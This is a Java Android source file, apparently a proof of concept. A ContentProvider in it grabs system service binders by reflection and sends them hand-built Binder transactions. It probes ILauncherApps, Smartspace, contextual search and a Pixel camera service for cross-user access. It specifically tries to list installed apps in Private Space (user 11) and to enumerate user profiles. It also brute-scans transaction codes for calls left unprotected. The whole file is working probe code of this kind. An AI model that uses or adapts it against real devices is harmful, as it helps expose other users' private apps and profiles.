package com.poc.crossuser;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.database.Cursor;
import android.database.MatrixCursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.Binder;
import android.os.Parcel;
import java.lang.reflect.Method;

public class LauncherSmartProbeProvider extends ContentProvider {

    @Override
    public boolean onCreate() { return true; }

    @Override
    public Cursor query(Uri uri, String[] proj, String sel, String[] selArgs, String sort) {
        MatrixCursor cursor = new MatrixCursor(new String[]{"test", "result"});
        cursor.addRow(new Object[]{"uid", String.valueOf(android.os.Process.myUid())});

        probeLauncherApps(cursor);
        probeSmartspace(cursor);
        probeContextualSearch(cursor);
        probePixelCamera(cursor);

        return cursor;
    }

    private void probeLauncherApps(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("launcherapps");
        if (binder == null) { cursor.addRow(new Object[]{"launcher", "no_binder"}); return; }
        String desc = "android.content.pm.ILauncherApps";

        // ILauncherApps — very powerful:
        // TX=1: addOnAppsChangedListener(String callingPackage, IOnAppsChangedListener)
        // TX=3: getLauncherActivities(String callingPackage, String packageName, UserHandle)
        //   ^^ reveals installed apps for ANY user if accessible cross-user
        // TX=4: resolveActivity(String callingPackage, ComponentName, UserHandle)
        // TX=5: startActivityAsUser(...) — launch activities as another user!
        // TX=8: getShortcuts(String callingPackage, ShortcutQueryWrapper, UserHandle)
        //   ^^ get shortcuts from other apps
        // TX=14: getProfiles() — get all user profiles (reveals Private Space existence!)
        // TX=18: getActivityList(String callingPackage, String packageName, UserHandle)
        // TX=22: getShortcutConfigActivities(String callingPackage, String packageName, UserHandle)

        // TX=14: getProfiles — reveals all user profiles
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            binder.transact(14, data, reply, 0);
            reply.readException();
            // List<UserHandle>
            int count = reply.readInt();
            cursor.addRow(new Object[]{"profiles", "count=" + count});
            if (count > 0 && count < 20) {
                for (int i = 0; i < count; i++) {
                    try {
                        int present = reply.readInt();
                        if (present != 0) {
                            int userId = reply.readInt();
                            cursor.addRow(new Object[]{"profile_" + i, "userId=" + userId});
                        }
                    } catch (Exception e) { break; }
                }
            }
        } catch (Exception e) {
            cursor.addRow(new Object[]{"profiles", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX=3: getLauncherActivities for user 11 (Private Space)
        data = Parcel.obtain();
        reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(desc);
            data.writeString(getContext().getPackageName());
            data.writeString(null); // all packages
            // UserHandle parcelable
            data.writeInt(1); // present
            data.writeInt(11); // userId
            binder.transact(3, data, reply, 0);
            reply.readException();
            // ParceledListSlice
            int count = reply.readInt();
            if (count > 0) {
                cursor.addRow(new Object[]{"launcher_u11",
                    "CROSS_USER! " + count + " apps in Private Space!"});
            } else {
                cursor.addRow(new Object[]{"launcher_u11", "empty/denied"});
            }
        } catch (SecurityException e) {
            cursor.addRow(new Object[]{"launcher_u11", "SEC:" + truncate(e.getMessage())});
        } catch (Exception e) {
            cursor.addRow(new Object[]{"launcher_u11", "ERR:" + truncate(e.getMessage())});
        }
        data.recycle();
        reply.recycle();

        // TX scan for accessible methods
        for (int tx = 1; tx <= 25; tx++) {
            if (tx == 3 || tx == 14) continue;
            data = Parcel.obtain();
            reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeString(null);
                data.writeInt(0);
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 4) {
                            cursor.addRow(new Object[]{"la_tx" + tx, "OK avail=" + avail});
                        }
                    } catch (SecurityException e) {
                        // skip most
                        if (tx <= 5) cursor.addRow(new Object[]{"la_tx" + tx, "SEC"});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && !msg.contains("Null") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"la_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {}
            data.recycle();
            reply.recycle();
        }
    }

    private void probeSmartspace(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("smartspace");
        if (binder == null) { cursor.addRow(new Object[]{"smartspace", "no_binder"}); return; }
        String desc = "android.app.smartspace.ISmartspaceManager";

        // ISmartspaceManager — shows personalized At-a-Glance data
        // TX=1: createSmartspaceSession(SmartspaceConfig, ISmartspaceCallback, IBinder)
        // TX=4: requestSmartspaceUpdate(IBinder sessionId)
        // TX=5: getSmartspaceSessionId() — leak session info

        for (int tx = 1; tx <= 8; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                data.writeStrongBinder(new Binder());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        if (avail > 0) {
                            cursor.addRow(new Object[]{"smart_tx" + tx, "OK avail=" + avail});
                        } else {
                            cursor.addRow(new Object[]{"smart_tx" + tx, "OK_empty"});
                        }
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"smart_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"smart_tx" + tx, "EX:" + truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"smart_tx" + tx, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probeContextualSearch(MatrixCursor cursor) {
        IBinder binder = getServiceBinder("contextual_search");
        if (binder == null) { cursor.addRow(new Object[]{"ctx_search", "no_binder"}); return; }
        String desc = "android.app.contextualsearch.IContextualSearchManager";

        // New in Android 16 — contextual search (AI-powered on-device search)
        for (int tx = 1; tx <= 10; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                data.writeInt(0);
                data.writeStrongBinder(new Binder());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        cursor.addRow(new Object[]{"cs_tx" + tx, "OK avail=" + avail});
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"cs_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && !msg.contains("consumed") && msg.length() > 5) {
                            cursor.addRow(new Object[]{"cs_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {
                if (tx <= 3) cursor.addRow(new Object[]{"cs_tx" + tx, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private void probePixelCamera(MatrixCursor cursor) {
        // Try Pixel camera service
        IBinder binder = getServiceBinder(
            "com.google.pixel.camera.services.binder.IServiceBinder/default");
        if (binder == null) {
            cursor.addRow(new Object[]{"pixel_camera", "no_binder"});
            return;
        }
        String desc = "com.google.pixel.camera.services.binder.IServiceBinder";

        for (int tx = 1; tx <= 5; tx++) {
            Parcel data = Parcel.obtain();
            Parcel reply = Parcel.obtain();
            try {
                data.writeInterfaceToken(desc);
                data.writeString(getContext().getPackageName());
                boolean result = binder.transact(tx, data, reply, 0);
                if (result) {
                    try {
                        reply.readException();
                        int avail = reply.dataAvail();
                        cursor.addRow(new Object[]{"pcam_tx" + tx, "OK avail=" + avail});
                    } catch (SecurityException e) {
                        cursor.addRow(new Object[]{"pcam_tx" + tx, "SEC:" + truncate(e.getMessage())});
                    } catch (Exception e) {
                        String msg = e.getMessage();
                        if (msg != null && msg.length() > 3) {
                            cursor.addRow(new Object[]{"pcam_tx" + tx, truncate(msg)});
                        }
                    }
                }
            } catch (Exception e) {
                cursor.addRow(new Object[]{"pcam_tx" + tx, "ERR:" + e.getClass().getSimpleName()});
            }
            data.recycle();
            reply.recycle();
        }
    }

    private String truncate(String s) {
        if (s == null) return "null";
        return s.length() > 120 ? s.substring(0, 120) : s;
    }

    private IBinder getServiceBinder(String name) {
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method m = sm.getMethod("getService", String.class);
            return (IBinder) m.invoke(null, name);
        } catch (Exception e) {
            return null;
        }
    }

    @Override public String getType(Uri uri) { return null; }
    @Override public Uri insert(Uri uri, ContentValues values) { return null; }
    @Override public int delete(Uri uri, String sel, String[] selArgs) { return 0; }
    @Override public int update(Uri uri, ContentValues values, String sel, String[] selArgs) { return 0; }
}
